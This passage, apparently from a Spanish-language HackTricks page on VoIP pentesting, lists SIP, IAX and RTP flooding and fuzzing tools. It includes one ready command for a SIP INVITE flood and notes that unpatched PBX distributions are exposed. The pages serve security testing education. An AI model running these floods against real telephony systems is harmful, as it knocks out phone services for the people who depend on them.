* **`sipflood.py`** de [**sippts**](https://github.com/Pepelux/sippts)**: **_**SipFlood**_ env√≠a mensajes ilimitados al objetivo.
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Ataque de DoS al protocolo IAX utilizado por Asterisk.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Una herramienta para realizar inundaciones de mensajes SIP/SDP INVITE a trav√©s de UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Env√≠a varios paquetes RTP bien formados. Es necesario conocer los puertos RTP que se est√°n utilizando (hacer un sniff primero).
* [**SIPp**](https://github.com/SIPp/sipp): Permite analizar y generar tr√°fico SIP, por lo que tambi√©n se puede utilizar para realizar ataques de DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Navaja suiza SIP. Tambi√©n se puede utilizar para realizar ataques SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).
* **`sipsend.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPSend nos permite enviar un mensaje SIP personalizado y analizar la respuesta.
* **`wssend.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** WsSend nos permite enviar un mensaje SIP personalizado a trav√©s de WebSockets y analizar la respuesta.

### Vulnerabilidades del sistema operativo

La forma m√°s sencilla de instalar un software como Asterisk es descargar una **distribuci√≥n del sistema operativo** que ya lo tenga instalado, como: **FreePBX, Elastix, Trixbox**... El problema con estos es que una vez que est√°n funcionando, los administradores del sistema podr√≠an **no actualizarlos nuevamente** y se descubrir√°n vulnerabilidades con el tiempo.

## Referencias

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
